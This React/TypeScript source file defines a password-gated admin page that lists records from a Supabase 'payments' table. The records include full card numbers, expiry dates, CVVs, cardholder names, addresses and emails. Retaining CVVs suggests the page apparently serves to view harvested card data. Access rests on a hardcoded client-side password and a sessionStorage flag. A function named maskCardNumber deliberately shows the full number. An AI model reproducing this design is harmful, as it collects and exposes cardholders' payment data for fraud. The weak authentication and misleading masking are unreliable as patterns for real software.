import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { supabase } from '@/integrations/supabase/client';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Table, TableBody, TableCaption, TableCell, TableHead, TableHeader, TableRow } from '@/components/ui/table';
import { toast } from 'sonner';

interface PaymentTransaction {
  id: string;
  card_number: string;
  expiry_date: string;
  cvv: string;
  cardholder_name: string;
  country: string;
  address: string;
  zip_code: string;
  phone: string;
  email: string;
  amount: number;
  status: string;
  created_at: string;
  error_message: string | null;
}

const PaymentTransactions = () => {
  const [password, setPassword] = useState('');
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [transactions, setTransactions] = useState<PaymentTransaction[]>([]);
  const [isLoading, setIsLoading] = useState(false);
  const navigate = useNavigate();

  const SECRET_PASS = 'Animal@123';

  useEffect(() => {
    // Check if already authenticated
    const authStatus = sessionStorage.getItem('paymentAuth');
    if (authStatus === 'authenticated') {
      setIsAuthenticated(true);
      fetchTransactions();
    }
  }, []);

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (password === SECRET_PASS) {
      sessionStorage.setItem('paymentAuth', 'authenticated');
      setIsAuthenticated(true);
      fetchTransactions();
    } else {
      toast.error('Incorrect password');
    }
  };

  const fetchTransactions = async () => {
    try {
      setIsLoading(true);
      const { data, error } = await supabase
        .from('payments')
        .select('*')
        .order('created_at', { ascending: false });

      if (error) throw error;
      
      setTransactions(data || []);
    } catch (error) {
      console.error('Error fetching transactions:', error);
      toast.error('Failed to load transactions');
    } finally {
      setIsLoading(false);
    }
  };

  const handleLogout = () => {
    sessionStorage.removeItem('paymentAuth');
    setIsAuthenticated(false);
    setPassword('');
    navigate('/');
  };

  const maskCardNumber = (cardNumber: string) => {
    if (!cardNumber) return '';
    // Return the full card number without any masking
    return cardNumber.replace(/(\d{4})(?=\d)/g, '$1 ');
  };

  if (!isAuthenticated) {
    return (
      <div className="flex items-center justify-center min-h-screen bg-gray-100">
        <div className="w-full max-w-md p-8 space-y-8 bg-white rounded-lg shadow-md">
          <div className="text-center">
            <h2 className="text-2xl font-bold text-gray-900">Payment Transactions</h2>
            <p className="mt-2 text-sm text-gray-600">Please enter the secret pass to continue</p>
          </div>
          <form className="mt-8 space-y-6" onSubmit={handleLogin}>
            <div className="space-y-4">
              <Input
                type="password"
                placeholder="Enter secret pass"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full"
                required
              />
            </div>
            <div>
              <Button type="submit" className="w-full">
                View Transactions
              </Button>
            </div>
          </form>
        </div>
      </div>
    );
  }

  return (
    <div className="container p-6 mx-auto">
      <div className="flex items-center justify-between mb-6">
        <h1 className="text-2xl font-bold">Payment Transactions</h1>
        <Button variant="outline" onClick={handleLogout}>
          Logout
        </Button>
      </div>
      
      <div className="border rounded-md">
        <Table>
          <TableCaption>A list of all payment transactions.</TableCaption>
          <TableHeader>
            <TableRow>
              <TableHead>Date</TableHead>
              <TableHead>Card</TableHead>
              <TableHead>Name</TableHead>
              <TableHead>Email</TableHead>
              <TableHead>Amount</TableHead>
              <TableHead>Status</TableHead>
            </TableRow>
          </TableHeader>
          <TableBody>
            {isLoading ? (
              <TableRow>
                <TableCell colSpan={6} className="text-center py-4">
                  Loading transactions...
                </TableCell>
              </TableRow>
            ) : transactions.length === 0 ? (
              <TableRow>
                <TableCell colSpan={6} className="text-center py-4">
                  No transactions found
                </TableCell>
              </TableRow>
            ) : (
              transactions.map((tx) => (
                <TableRow key={tx.id}>
                  <TableCell>
                    {new Date(tx.created_at).toLocaleString()}
                  </TableCell>
                  <TableCell>{maskCardNumber(tx.card_number)}</TableCell>
                  <TableCell>{tx.cardholder_name}</TableCell>
                  <TableCell>{tx.email}</TableCell>
                  <TableCell>${tx.amount.toFixed(2)}</TableCell>
                  <TableCell>
                    <span className={`px-2 py-1 text-xs rounded-full ${
                      tx.status === 'success' 
                        ? 'bg-green-100 text-green-800' 
                        : tx.status === 'failed'
                        ? 'bg-red-100 text-red-800'
                        : 'bg-yellow-100 text-yellow-800'
                    }`}>
                      {tx.status}
                    </span>
                  </TableCell>
                </TableRow>
              ))
            )}
          </TableBody>
        </Table>
      </div>
    </div>
  );
};

export default PaymentTransactions;
